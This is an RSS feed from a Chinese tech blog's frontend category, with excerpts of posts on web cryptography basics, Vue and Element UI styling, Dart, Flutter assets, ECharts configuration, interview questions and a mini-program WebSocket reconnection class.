<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>前端 on 暗网探秘</title>
    <link>https://anwangtanmi.github.io/categories/%E5%89%8D%E7%AB%AF/</link>
    <description>Recent content in 前端 on 暗网探秘</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-CN</language>
    <lastBuildDate>Tue, 12 Nov 2019 09:46:41 +0800</lastBuildDate>
    <atom:link href="https://anwangtanmi.github.io/categories/%E5%89%8D%E7%AB%AF/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>一文搞懂web中暗藏的密码学</title>
      <link>https://anwangtanmi.github.io/posts/3da2d3fe46f6fdef7da45b101607af3a/</link>
      <pubDate>Tue, 12 Nov 2019 09:46:41 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/3da2d3fe46f6fdef7da45b101607af3a/</guid>
      <description>前言 开发网站登录功能时，如何保证密码在传输过程/储存的安全？&#xA;相信不少前后端的朋友，在面试时都会被问到类似的问题。&#xA;在我对密码学一无所知时，也仅会回答：“MD5加密啊。”&#xA;诸不知，密码学在网络七层模型，甚至web开发中的应用比我想象得多得多。&#xA;1. 什么是密码学？ 密码学是各种安全应用程序所必需的，现代密码学旨在创建通过应用数学原理和计算机科学来保护信息的机制。但相比之下，密码分析旨在解密此类机制，以便获得对信息的非法访问。&#xA;密码学具有三个关键属性：&#xA;机密性，为了防止未经授权的各方访问信息（换句话说，是要确保只有经过授权的人才能访问受限制的数据）。 完整性，是指保护信息不被随意篡改 真实性，与识别信息的所有者有关。 例如个人医疗数据：&#xA;机密性，个人医疗数据需要保密，这意味着只有医生或医护人员才能访问它。 完整性，还必须保护其完整性，因为篡改此类数据可能导致错误的诊断或治疗，并给患者带来健康风险。 真实性，患者数据应与已识别的个人联系起来，且患者需要知道操作者（医生）是谁。 在本文中，我们将从加密，哈希，编码和混淆四种密码学基础技术来入门。&#xA;本文图片经过再制，方便看懂。&#xA;大纲和主体内容引自： How Secure Are Encryption, Hashing, Encoding and Obfuscation?&#xA;2. 什么是加密？ 加密定义：以保证机密性的方式转换数据的过程。&#xA;为此，加密需要使用一个保密工具，就密码学而言，我们称其为“密钥”。&#xA;加密密钥和任何其他加密密钥应具有一些属性：&#xA;为了保护机密性，密钥的值应难以猜测。 应该在单个上下文中使用它，避免在不同上下文中重复使用（类比JS作用域）。密钥重用会带来安全风险，如果规避了其机密性，则影响更大，因为它“解锁”了更敏感的数据。 2.1 加密的分类：对称和非对称 加密分为两类：对称和非对称&#xA;对称加密：&#xA;用途：文件系统加密，Wi-Fi保护访问（WPA），数据库加密（例如信用卡详细信息）&#xA;非对称加密：&#xA;用途： TLS，VPN，SSH。&#xA;其主要区别是：所需的密钥数量：&#xA;在对称加密算法中，单个密用于加密和解密数据。只有那些有权访问数据的人才能拥有单个共享密钥。 在非对称加密算法中，使用了两个密钥：一个是公用密钥，一个是私有密钥。顾名思义，私钥必须保密，而每个人都可以知道公钥。 应用加密时，将使用公钥，而解密则需要私钥。 任何人都应该能够向我们发送加密数据，但是只有我们才能够解密和读取它。 通常使用非对称加密来在不安全的通道上进行通信时，两方之间会安全地建立公共密钥。 通过此共享密钥，双方切换到对称加密。 这种加密速度更快，更适合处理大量数据。 能被密码界承认的加密算法都是公开的：&#xA;某些公司使用专有或“军事级”加密技术进行加密，这些技术是“私有的”。且基于“复杂“算法，但这不是加密的工作方式。 密码界广泛使用和认可的所有加密算法都是公开的，因为它们基于数学算法，只有拥有密钥或先进的计算能力才能解决。 公开算法是得到广泛采用，证明了其价值的。 3. 什么是哈希？ 哈希算法定义：·一种只能加密，不能解密的密码学算法，可以将任意长度的信息转换成一段固定长度的字符串。&#xA;加密算法是可逆的（使用密钥），并且可以提供机密性（某些较新的加密算法也可以提供真实性），而哈希算法是不可逆的，并且可以提供完整性，以证明未修改特定数据。&#xA;哈希算法的前提很简单：给定任意长度的输入，输出特定长度的字节。在大多数情况下，此字节序列对于该输入将是唯一的，并且不会给出输入是什么的指示。换一种说法：&#xA;仅凭哈希算法的输出，是无法确定原始数据的。 取一些任意数据以及使用哈希算法输出，就可以验证此数据是否与原始输入数据匹配，从而无需查看原始数据。 为了说明这一点，请想象一个强大的哈希算法通过将每个唯一输入放在其自己的存储桶中而起作用。当我们要检查两个输入是否相同时，我们可以简单地检查它们是否在同一存储桶中。&#xA;散列文件的存储单位称为桶（Bucket）&#xA;3.1 例子一：资源下载 提供文件下载的网站通常会返回每个文件的哈希值，以便用户可以验证其下载副本的完整性。&#xA;例如，在Debian的图像下载服务中，您会找到其他文件，例如SHA256SUMS，其中包含可供下载的每个文件的哈希输出（在本例中为SHA-256算法）。&#xA;下载文件后，可以将其传递给选定的哈希算法，输出一段哈希值 用该哈希值来与校验和文件中列出的哈希值作匹配，以校验是否一致。 在终端中，可以用openssl来对文件进行哈希处理：</description>
    </item>
    <item>
      <title>Deferred Deep Linking in iOS</title>
      <link>https://anwangtanmi.github.io/posts/a239cde5df7a9ae1aa489cb8798e2454/</link>
      <pubDate>Wed, 16 Oct 2019 11:12:40 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/a239cde5df7a9ae1aa489cb8798e2454/</guid>
      <description>Deep Linking 其实 deep linking 并不是一个新名词，在 web 开发领域，区别于指向首页的链接（http://tech.glowing.com/），deep linking 是指向具体内容页的链接（http://tech.glowing.com/cn/advices-to-junior-developers/）。在移动开发领域，deep linking 则是指 mobile app 在 handle 特定 URI 的时候可以直接跳转到对应的内容页或触发特定逻辑，而不仅仅是启动 app。比如 dianping://shopinfo?id=1859284，如果你的手机上装了大众点评的话点击这个链接可以直接跳转到商铺页面。这样做的好处主要有：&#xA;在 web 和 app 的切换过程中保留上下文 App 间带上下文切换（用于实现 app 间参数的传递，如授权协议，分享 API 等） Web 页可以被搜索引擎索引，可以通过 SEO 增加访问量从而提高 app 下载量和开启率 目前处理 deep linking，主要有两种方式：&#xA;Custom URL Scheme 在 universal links 出现之前的很长一段时间里，iOS 上主要通过 custom URL scheme 来实现 deep linking，以及 app 间的通信。&#xA;在 info plist 里设置了自定义 URL 后，handle URL 的入口是 app delegate 方法 application:openURL:sourceApplication:annotation:（iOS 9 开始被 deprecate）或 application:openURL:options:（iOS 9 引入，但如果没有实现这个方法，在 iOS 9 上还是会向前兼容 call 老方法，所以一般还是实现老方法）。</description>
    </item>
    <item>
      <title>样式设置 /deep/</title>
      <link>https://anwangtanmi.github.io/posts/f70a22644614e9910397246a24bcf671/</link>
      <pubDate>Fri, 27 Sep 2019 11:02:04 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/f70a22644614e9910397246a24bcf671/</guid>
      <description>样式设置scoped属性带来的问题 通常我们在写样式的时候会在style标签中加上scoped属性，相信这个属性的作用大家都很清楚（Scoped CSS规范是Web组件产生不污染其他组件，也不被其他组件污染的CSS规范），但是这样有时候也会遇到问题：&#xA;假如我写了一个公用组件，想在父组件中改公共组件的样式，用通常的样式覆盖是不可以的。&#xA;解决方案 这时候需要用到 /deep/。</description>
    </item>
    <item>
      <title>elementui组件—— el-scroll的使用</title>
      <link>https://anwangtanmi.github.io/posts/6b7c0e6902a25e94f51224f33cf4fa26/</link>
      <pubDate>Thu, 29 Aug 2019 14:39:49 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/6b7c0e6902a25e94f51224f33cf4fa26/</guid>
      <description>项目开发中使用到了elementui组件，后期发现浏览器中的滚动条不仅占宽，还与页面暗色风格不搭配。于是打算寻找一款插件使用，而elementui中的scroll组件刚好满足需要而且兼容ie10+。&#xA;官网侧边栏中scroll的使用截图&#xA;使用方法 直接在页面中调用el-scroll组件&#xA;占位 页面内渲染出的dom结构可以看出，组件内总共有三块内容&#xA;最外层：el-scrollbar。使用时需要指定高度和宽度 第一块代码：el-scroll__wrap：&#xA;1).overflow:scroll是写在这里的，通过margin为负，将浏览器中的原始滚动条排除视觉内隐藏掉。&#xA;2).el-scroll__view包裹滚动区域 第二块代码：el-scroll__bar is-horizontal: 横向滚动条 第三块代码：el-scroll__bar is-vertical: 纵向滚动条 组件的自定义属性 根据官网的scroll组件源码，可以看到scroll组件是有几个属性可以传入的。具体使用可以自己研究下，主要就是传入自定义样式和class，注意自定义stlye接收的是数组类型。&#xA;举栗子：</description>
    </item>
    <item>
      <title>vue-amap中添加高德地图地图的自定义样式</title>
      <link>https://anwangtanmi.github.io/posts/e0e3b7edd595cbd4d80fd6f49d5033e7/</link>
      <pubDate>Tue, 20 Aug 2019 13:53:40 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/e0e3b7edd595cbd4d80fd6f49d5033e7/</guid>
      <description>vue-amap中添加高德地图地图的自定义样式 高德地图的自定义样式列表：&#xA;使用： amap://styles/+ 样式的名称&#xA;如： 使用标准颜色&#xA;amap://styles/normal&#xA;依次类推&#xA;标准&#xA;normal&#xA;幻影黑&#xA;dark&#xA;月光银&#xA;light&#xA;远山黛&#xA;whitesmoke&#xA;草色青&#xA;fresh&#xA;雅士灰&#xA;grey&#xA;涂鸦&#xA;graffiti&#xA;马卡龙&#xA;macaron&#xA;靛青蓝&#xA;blue&#xA;极夜蓝&#xA;darkblue&#xA;酱籽&#xA;wine&#xA;vue中：&#xA;script :&#xA;Recent Posts 暗网网址导航大全（2021年12月更新） 暗网网址合集 暗网链接 Deep Web Link Director 全球十大暗网搜索引擎 最详细的暗网教程——tor洋葱浏览器的安装和使用方法 最新darkweb暗网搜索引擎——Tordex | The Uncensored Tor Search Engine 顶级保密暗网网址分享 如何进入暗网？教程+工具 Tor 洋葱浏览器 如何进入暗网详细步骤（暗网网桥获取方法） 什么是“暗网”？我们该如何访问? Deep Web / Dark Web 大全 Tagsandroid (10) application (5) google (7) hacker (5) internet (5) java (7) Linux (16) network (6) qq (4) Source Code Analysis (15) tor (44) ubuntu (14) web (21) windows (9) 互联网 (7) 产品 (6) 代理服务器 (5) 信息安全 (4) 其他 (7) 区块链 (4) 存储 (4) 安全 (11) 工作 (20) 工具 (10) 手机 (9) 搜索引擎 (5) 暗网 (16) 服务器 (10) 杂项 (17) 活动 (12) 测试 (5) 浏览器 (19) 深度学习 (5) 照片 (6) 爬虫 (7) 物理学猜想 (10) 环境搭建 (3) 生活 (23) 电信 (4) 电话 (5) 百度 (4) 算法 (5) 网络 (52) 网络安全 (18) 网络安全知识 (6) Categories AI (5) AltiumDesigner (7) BTC (6) darknet (25) Database (3) DeepLearning (78) Docker (1) GIS (9) Google (2) iOS (7) IT (7) java (37) Life (93) linux (86) LPC (11) macOS (6) mysql (5) Python (52) qt (5) SEO (2) threejs (5) Unity (19) 产品设计 (15) 人工智能 (12) 信息安全 (36) 前端 (128) 区块链 (14) 图像处理 (59) 图形视频 (36) 大数据 (15) 嵌入式 (7) 工具 (45) 开发 (57) 性能优化 (2) 技术 (18) 搜索 (10) 操作系统 (35) 教程知识 (1) 教育 (2) 数字图像处理 (3) 数据分析 (2) 数据库 (4) 数据结构 (3) 数论 (1) 显卡驱动 (1) 智能搜索技术 (3) 未分类 (496) 机器学习 (23) 模型压缩 (2) 模拟电路 (1) 模拟题 (1) 比特币 (3) 水下图像增强 (1) 测试 (4) 浏览器 (1) 深网 (2) 渗透测试 (4) 游戏 (2) 游戏开发 (16) 爬虫 (6) 环境搭建 (2) 生活 (5) 电子商务 (1) 硬件设计 (1) 社工库 (1) 神经机制 (1) 移动web (1) 移动开发 (76) 程序员 (6) 站长 (1) 算法 (9) 统计搜索 (9) 网络优化 (7) 网络安全 (80) 视觉 (4) 计算机 (31) 论文 (8) 设计 (6) 资源搜集 (1) 资讯 (34) 软件工具 (15) 软件开发 (26) 运维 (21) 逆向 (2) 项目管理 (4) Archives December 2021 (1) August 2021 (8) April 2020 (4) March 2020 (63) February 2020 (154) January 2020 (134) December 2019 (14) November 2019 (25) October 2019 (27) September 2019 (43) August 2019 (32) July 2019 (51) June 2019 (49) May 2019 (65) April 2019 (64) March 2019 (97) February 2019 (49) January 2019 (78) December 2018 (70) November 2018 (69) October 2018 (31) September 2018 (73) August 2018 (109) July 2018 (70) June 2018 (58) May 2018 (51) April 2018 (52) March 2018 (52) February 2018 (19) January 2018 (25) December 2017 (39) November 2017 (31) October 2017 (26) September 2017 (42) August 2017 (46) July 2017 (50) June 2017 (71) May 2017 (32) April 2017 (29) March 2017 (36) February 2017 (18) January 2017 (25) December 2016 (20) November 2016 (17) October 2016 (19) September 2016 (14) August 2016 (23) July 2016 (26) June 2016 (15) May 2016 (11) April 2016 (21) March 2016 (18) February 2016 (21) January 2016 (14) December 2015 (13) November 2015 (13) October 2015 (6) September 2015 (7) August 2015 (12) July 2015 (11) June 2015 (3) May 2015 (9) April 2015 (12) March 2015 (7) February 2015 (10) January 2015 (10) December 2014 (14) November 2014 (6) October 2014 (10) September 2014 (6) August 2014 (10) July 2014 (11) June 2014 (6) May 2014 (9) April 2014 (6) March 2014 (5) February 2014 (3) January 2014 (3) December 2013 (12) November 2013 (7) October 2013 (6) September 2013 (7) August 2013 (4) July 2013 (5) June 2013 (6) May 2013 (28) April 2013 (17) March 2013 (4) February 2013 (2) January 2013 (6) December 2012 (6) November 2012 (4) October 2012 (6) September 2012 (6) August 2012 (4) July 2012 (8) June 2012 (5) May 2012 (8) April 2012 (15) March 2012 (5) February 2012 (2) January 2012 (3) December 2011 (9) November 2011 (4) October 2011 (1) September 2011 (4) August 2011 (4) July 2011 (4) June 2011 (4) May 2011 (6) April 2011 (2) March 2011 (4) February 2011 (2) January 2011 (3) December 2010 (6) November 2010 (6) October 2010 (5) September 2010 (8) August 2010 (8) July 2010 (7) June 2010 (3) May 2010 (14) April 2010 (7) February 2010 (4) January 2010 (11) December 2009 (8) November 2009 (3) October 2009 (5) September 2009 (4) July 2009 (7) April 2009 (5) March 2009 (5) February 2009 (3) January 2009 (3) December 2008 (5) November 2008 (5) October 2008 (3) September 2008 (3) August 2008 (2) July 2008 (5) June 2008 (6) May 2008 (9) April 2008 (4) March 2008 (5) February 2008 (4) January 2008 (3) December 2007 (6) November 2007 (3) October 2007 (1) September 2007 (5) August 2007 (2) July 2007 (3) June 2007 (3) May 2007 (1) April 2007 (1) March 2007 (2) February 2007 (2) January 2007 (3) December 2006 (1) November 2006 (3) September 2006 (3) July 2006 (1) June 2006 (3) May 2006 (3) April 2006 (1) March 2006 (2) February 2006 (3) January 2006 (1) December 2005 (2) November 2005 (1) September 2005 (1) August 2005 (1) July 2005 (2) April 2005 (2) March 2005 (3) February 2005 (2) January 2005 (2) December 2004 (2) November 2004 (4) September 2004 (2) August 2004 (2) July 2004 (2) September 2003 (1) May 2002 (1) March 2002 (1) Copyright ©️uzzz.</description>
    </item>
    <item>
      <title>vue-easytable问题笔记</title>
      <link>https://anwangtanmi.github.io/posts/6432930744bab0e33d508f24a604351c/</link>
      <pubDate>Mon, 15 Jul 2019 00:13:52 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/6432930744bab0e33d508f24a604351c/</guid>
      <description> 文章参考 vue-easytable 排序 安装 拖拽 无法访问vue-easytable的API页面 之前收藏了vue-easytable的API页面，方便时刻查阅，前几次还好，后面发现推荐给同事和自己打开的时候，就出现了无法访问，开始以为是网络问题或者是服务器挂了，后面发现，只要通过github链接过去就可以了。&#xA;排序的问题 根据文档，只需要添加multiple-sort属性即可，但是页面还是无法出现相关的图标，最后跟官网的demo每个字段做相关的对比，原来是我的cloumn的值要在对应的字段中添加orderBy:&#39;asc&#39;属性&#xA;export default{ name: &#39;sort-by-multiple-columns&#39;, data(){ return { tableData: [ {&#34;name&#34;:&#34;赵伟&#34;,&#34;tel&#34;:&#34;156*****1987&#34;,&#34;hobby&#34;:&#34;钢琴、书法、唱歌&#34;,&#34;address&#34;:&#34;上海市黄浦区金陵东路569号17楼&#34;} ], columns: [ {field: &#39;name&#39;, title: &#39;姓名&#39;, width: 80, titleAlign: &#39;center&#39;,columnAlign:&#39;center&#39;,orderBy:&#39;asc&#39;,isResize:true} } }, methods: { } } 拖拽的问题 根据文档的要求，我只需要添加 column-width-drag 这个组件就可以了，发现不管怎么使用，都无法拖拽。最后找同事帮忙解决了，原来是因为我设置了不显示表格的border；即 :show-vertical-border=&#39;true&#39;即可&#xA;&amp;lt;v-table :columns=&#39;columns&#39; :table-data=&#39;tableData&#39; :show-vertical-border=&#39;true&#39; column-width-drag &amp;gt;v-table&amp;gt; </description>
    </item>
    <item>
      <title>Dart语言入门(一)</title>
      <link>https://anwangtanmi.github.io/posts/ca56c29ebc2f7ec8f92ff588df767129/</link>
      <pubDate>Mon, 08 Jul 2019 20:10:50 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/ca56c29ebc2f7ec8f92ff588df767129/</guid>
      <description>最近好长时间没有写博客，也不知道要写点什么，一直也静不下心来学习，想看会学习视频，手机又放不下，看一会就去玩手机了。最近好不容易下定决心学习一波，虽然有时候还是会玩手机，但是比以前好太多了。&#xA;以后我的博客会侧重于Flutter的讲解，有时间也会穿插着Android的一些知识。现在就让我们开始Flutter的踩坑之路吧。&#xA;前言 Dart诞生于2011年10月10日，是一种“结构化的Web编程”语言，Dart编程语言在所有现在浏览器和环境中提供高性能。Dart用于Web、服务器、移动应用和物联网等领域的开发。&#xA;Dart语言的特性 ①.Dart是AOT(Ahead Of Time)编译的，编译成快速、可预测的本地代码，使Flutter几乎都可以使用Dart编写。&#xA;②.Dart也可以JIT(Just In Time)编译，开发周期异常快，工作流颠覆常规。&#xA;③.Dart可以更轻松地创建以60fps运行的流畅动画和转场。&#xA;④.Dart使Flutter不需要单独的声明式布局语言(如JSX或XML)，或单独的可视化界面构建器，因为Dart的声明式编程布局易于阅读和可视化&#xA;Dart重要概念 ①.所有的东西都是对象，无论是变量、数字、函数等都是对象。所有的对象都是类的实例。&#xA;②.程序中指定数据类型使得程序合理地分配内存空间，并帮助编译器进行语法检查。但是，指定类型不是必须的。Dart语言是弱数据类型。&#xA;③.Dart代码在运行前解析。指定数据类型和编译时的常量，可以提高运行速度。&#xA;④.Dart程序有统一的程序入口:main();&#xA;⑤.Dart没有public、protected和private的概念。私有特性通过变量或函数加上下划线来表示。&#xA;⑥.Dart的工具可以检查出警告信息(warning)和错误信息(error)。&#xA;⑦.Dart支持anync/await异步处理。&#xA;Dart语言常用库 包名 描述&#xA;dart:async 异步编程支持，提供Future和Stream类&#xA;dart:collection 对dart:core提供更多的集合支持&#xA;dart:convert 不同类型(JSON,UTF-8)间的字符编码、解码支持&#xA;dart:core Dart语言内建的类型、对象以及dart语言核心的功能&#xA;dart:html 网页开发用到的库&#xA;dart:io 文件读写I/O相关操作的库&#xA;dart:math 数字常量及函数，提供随机数算法&#xA;dart:svg 事件和动画的矢量图像支持&#xA;以下三个库的使用频率最高&#xA;①.dart:core:核心库，包括strings、numbers、collections、errors、dates、URIs等&#xA;②.dart：html:网页开发里DOM相关的一些库&#xA;③.dart:io:I/O命令行使用的I/O库&#xA;④.dart:core库是Dart语言初始已经包含的库，其他的任何库在使用前都需要加上import语句。&#xA;使用官方提供的pub工具可以安装丰富的第三方库。第三方库的地址为：pub.dartlang.org&#xA;环境准备 安装Dart SDK 官方共有三种SDK版本选择，分别是Flutter、Web、Server这三种，我们这里只是Dart编程语言的学习，只需要下载Server版的SDK就行。&#xA;网址是：https://dart.dev/tools/sdk/archive&#xA;分为Windows，Macos和Linux，根据自己的电脑系统下载所需的sdk&#xA;配置环境变量 我是在Windows上安装的，通过点击下一步即可安装，安装完成后，需将dart-sdk下的的bin目录添加到系统Path环境变量中。&#xA;测试是不是安装成功了，打开cmd，输入dart，出现红框里面的就是成功了&#xA;配置idea编辑器 我没有用官方推荐的VSCode编辑器，而是选择了idea编辑器，大家可以根据自己的需求选择编辑器。&#xA;在idea中使用Dart语言，要先安装Dart插件&#xA;依照如下步骤安装 Dart 的插件&#xA;1.依次选择 File -&amp;gt; Setting 打开 IDEA 设定的界面&#xA;2.选择 “Plugins” 选项，在输入输入“Dart”并点击搜索按钮</description>
    </item>
    <item>
      <title>你不知道的CSS– &gt;&gt;&gt; /deep/穿透</title>
      <link>https://anwangtanmi.github.io/posts/5d4c5b01adf96e4052e60131d2991364/</link>
      <pubDate>Thu, 27 Jun 2019 16:41:15 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/5d4c5b01adf96e4052e60131d2991364/</guid>
      <description> 解决Scoped CSS内想修改组件库组件样式问题：&#xA;分析：Scoped CSS规范是Web组件产生不污染其他组件，也不被其他组件污染的CSS规范。这样在打包的时候会生成一个独一无二hash值，这样父组件的样式就不会影响到子组件了&#xA;解决方案：&#xA;提取一个公共文件，在公共文件里面修改样式 存在问题：别人和你使用相同的组件，但并不想用你修改后的样式。当然，你们可以强行给自己的元素加一个独特的类名，或者尝试自己封装一个组件，但是都不太现实，所以就需要有一个方法，既不影响到别的地方，又能修改子组件在当前的样式。&#xA;使用&amp;gt;&amp;gt;&amp;gt;穿透scoped &amp;amp; &amp;gt;&amp;gt;&amp;gt; .swiper-container { overflow: visible; } .question[data-v-0b9a2966]表示子组件使用了scoped&#xA;注意：有些预编译器不支持&amp;gt;&amp;gt;&amp;gt;，可以使用/deep/&#xA;&amp;amp; /deep/ .swiper-container { overflow: visible; } </description>
    </item>
    <item>
      <title>解决Chrome插件安装时出现的“程序包无效”问题</title>
      <link>https://anwangtanmi.github.io/posts/8dcb5b0193675e09b1316bde847b361a/</link>
      <pubDate>Sun, 09 Jun 2019 16:48:22 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/8dcb5b0193675e09b1316bde847b361a/</guid>
      <description>原文：https://blog.csdn.net/ysq5202121/article/details/50809494</description>
    </item>
    <item>
      <title>2019web前端全新面试题库 一</title>
      <link>https://anwangtanmi.github.io/posts/a799fb144cbf331e8e2274566d8bdac3/</link>
      <pubDate>Wed, 22 May 2019 19:28:58 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/a799fb144cbf331e8e2274566d8bdac3/</guid>
      <description>1、用线性渐变实现如下图的斜线？&#xA;答案：&#xA;div{margin:50px auto; width:100px;height:100px;border:1px solid #333; background:linear-gradient(45deg, transparent 49.5%, deeppink 49.5%, deeppink 50.5%, transparent 50.5%);&#xA;}&#xA;2、用CSS实现单行居中显示文字，多行居左显示效果，如图：&#xA;答案:&#xA;只有一行时居中显示文字，多行居左显示多行居左显示&#xA;body,p{ margin: 0; padding: 0;}&#xA;div{text-align: center;width: 400px;height: 400px; background: #ddd; margin: 30px auto; font-size: 20px;}&#xA;p{display: inline-block;text-align: left;}&#xA;3、介绍一下标准的CSS的盒子模型？与低版本IE的盒子模型有什么不同的？&#xA;答案：标准的盒模型是基于 doctype 正确书写的情况下，并且是高于 IE6 的浏览器才会有的。&#xA;标准盒子模型：宽度=内容的宽度（content）+ border + padding + margin&#xA;低版本IE盒子模型：宽度=内容宽度（content+border+padding）+ margin&#xA;4、什么是外边距重叠？重叠的结果是什么？&#xA;答案：在CSS当中，相邻的两个盒子（可能是兄弟关系也可能是祖先关系）的外边距可以结合成一个单独的外边距。这种合并外边距的方式被称为折叠，并且因而所结合成的外边距称为折叠外边距。&#xA;折叠结果遵循下列计算规则：&#xA;1）两个相邻的外边距都是正数时，折叠结果是它们两者之间较大的值。&#xA;2）两个相邻的外边距都是负数时，折叠结果是两者绝对值的较大值。&#xA;3）两个外边距一正一负时，折叠结果是两者的相加的和。&#xA;5、请解释一下CSS3的Flexbox（弹性盒布局模型）,以及适用场景？&#xA;答案：一个用于页面布局的全新CSS3功能，Flexbox可以把列表放在同一个方向（从上到下排列，从左到右），并让列表能延伸到占用可用的空间。&#xA;较为复杂的布局还可以通过嵌套一个伸缩容器（flex container）来实现。采用Flex布局的元素，称为Flex容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为Flex项目（flex item），简称”项目”。常规布局是基于块和内联流方向，而Flex布局是基于flex-flow流可以很方便的用来做局中，能对不同屏幕大小自适应。在布局上有了比以前更加灵活的空间。</description>
    </item>
    <item>
      <title>Flutter资源管理</title>
      <link>https://anwangtanmi.github.io/posts/b00947d54ed4a9b2ec8539df8e7102d6/</link>
      <pubDate>Thu, 16 May 2019 19:41:22 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/b00947d54ed4a9b2ec8539df8e7102d6/</guid>
      <description>资源管理 Flutter应用程序可以包含代码和 assets（有时称为资源）。assets是会打包到程序安装包中的，可在运行时访问。常见类型的assets包括静态数据（例如JSON文件）、配置文件、图标和图片（JPEG，WebP，GIF，动画WebP / GIF，PNG，BMP和WBMP）等。&#xA;指定 assets 和包管理一样，Flutter也使用pubspec.yaml文件来管理应用程序所需的资源。举一个例子:&#xA;flutter: assets: - assets/my_icon.png - assets/background.png assets指定应包含在应用程序中的文件。 每个asset都通过相对于pubspec.yaml文件所在位置的显式路径进行标识。asset的声明顺序是无关紧要的。asset的实际目录可以是任意文件夹（在本示例中是assets）。&#xA;在构建期间，Flutter将asset放置到称为 asset bundle 的特殊存档中，应用程序可以在运行时读取它们（但不能修改）。&#xA;Asset 变体（variant） 构建过程支持asset变体的概念：不同版本的asset可能会显示在不同的上下文中。 在pubspec.yaml的assets部分中指定asset路径时，构建过程中，会在相邻子目录中查找具有相同名称的任何文件。这些文件随后会与指定的asset一起被包含在asset bundle中。&#xA;例如，如果应用程序目录中有以下文件:&#xA;…/pubspec.yaml …/graphics/my_icon.png …/graphics/background.png …/graphics/dark/background.png …etc. 然后pubspec.yaml文件中只需包含:&#xA;flutter: assets: - graphics/background.png 那么这两个graphics/background.png和graphics/dark/background.png 都将包含在您的asset bundle中。前者被认为是main asset （主资源），后者被认为是一种变体（variant）。&#xA;在选择匹配当前设备分辨率的图片时，Flutter会使用到asset变体（见下文），将来，Flutter可能会将这种机制扩展到本地化、阅读提示等方面。&#xA;加载 assets 您的应用可以通过AssetBundle对象访问其asset 。有两种主要方法允许从Asset bundle中加载字符串或图片(二进制)文件。&#xA;加载文本assets 通过rootBundle 对象加载：每个Flutter应用程序都有一个rootBundle对象， 通过它可以轻松访问主资源包，直接使用package:flutter/services.dart中全局静态的rootBundle对象来加载asset即可。 通过 DefaultAssetBundle 加载：建议使用 DefaultAssetBundle 来获取当前BuildContext的AssetBundle。 这种方法不是使用应用程序构建的默认asset bundle，而是使父级widget在运行时动态替换的不同的AssetBundle，这对于本地化或测试场景很有用。 通常，可以使用DefaultAssetBundle.of()在应用运行时来间接加载asset（例如JSON文件），而在widget上下文之外，或其它AssetBundle句柄不可用时，可以使用rootBundle直接加载这些asset，例如：&#xA;import &#39;dart:async&#39; show Future; import &#39;package:flutter/services.dart&#39; show rootBundle; Future loadAsset() async { return await rootBundle.</description>
    </item>
    <item>
      <title>echart相关操作xAxis,yAxis,series,grid,(包括x轴样式，y轴样式，折现样式，网格样式，折现阴影，折线上方显示数据，x轴文字倾斜)</title>
      <link>https://anwangtanmi.github.io/posts/3f989873d9f3cf073957b58b7781fc61/</link>
      <pubDate>Thu, 16 May 2019 15:49:52 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/3f989873d9f3cf073957b58b7781fc61/</guid>
      <description>样式截图大概如下：&#xA;1. x，y轴相关操作：xAxis，yAxis&#xA;(1) x，y轴的颜色：&#xA;axisLine: { lineStyle: { color: &#39;#2898e5&#39;, }, }, (2) x，y轴文字颜色：&#xA;axisLabel: { show: true, textStyle: { color: &#39;#019bf8&#39; } } （3）x，y轴刻度颜色：&#xA;axisTick: { lineStyle: { color: &#39;#2898e5&#39; } } (4) x，y轴坐标文字太长显示不全：,倾斜rotate&#xA;axisLabel: { show: true, interval: 0, rotate: 20 }, （5）x ,y 轴网格线的颜色：&#xA;splitLine: { show: true, lineStyle: { color: [&#39;rgb(1,155,246,0.3)&#39;], //网格线 width: 1, } }, 2. 折现 的样式&#xA;（1） 折现的平滑度series：&#xA;symbol: &#39;circle&#39;, //实心点 symbolSize: 6, //实心点的大小 smooth: true, //折现平滑 （2）折现的颜色：</description>
    </item>
    <item>
      <title>小程序WebSocket心跳检测，断线重连</title>
      <link>https://anwangtanmi.github.io/posts/fca9c29adac4524bac3eac781e91a0ba/</link>
      <pubDate>Sun, 05 May 2019 15:19:40 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/fca9c29adac4524bac3eac781e91a0ba/</guid>
      <description>我把小程序WebSocket的一些功能封装成一个类，里面包括建立连接、监听消息、发送消息、心跳检测、断线重连等等常用的功能。&#xA;export default class websocket { constructor({ heartCheck, isReconnection }) { // 是否连接 this._isLogin = false; // 当前网络状态 this._netWork = true; // 是否人为退出 this._isClosed = false; // 心跳检测频率 this._timeout = 3000; this._timeoutObj = null; // 当前重连次数 this._connectNum = 0; // 心跳检测和断线重连开关，true为启用，false为关闭 this._heartCheck = heartCheck; this._isReconnection = isReconnection; this._onSocketOpened(); } // 心跳重置 _reset() { clearTimeout(this._timeoutObj); return this; } // 心跳开始 _start() { let _this = this; this._timeoutObj = setInterval(() =&amp;gt; { wx.</description>
    </item>
    <item>
      <title>Vue&#43;Cesium从入门到放弃:拾贝</title>
      <link>https://anwangtanmi.github.io/posts/057e81c0d6e19fd8ff56e6ab11d32b1e/</link>
      <pubDate>Tue, 23 Apr 2019 19:11:57 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/057e81c0d6e19fd8ff56e6ab11d32b1e/</guid>
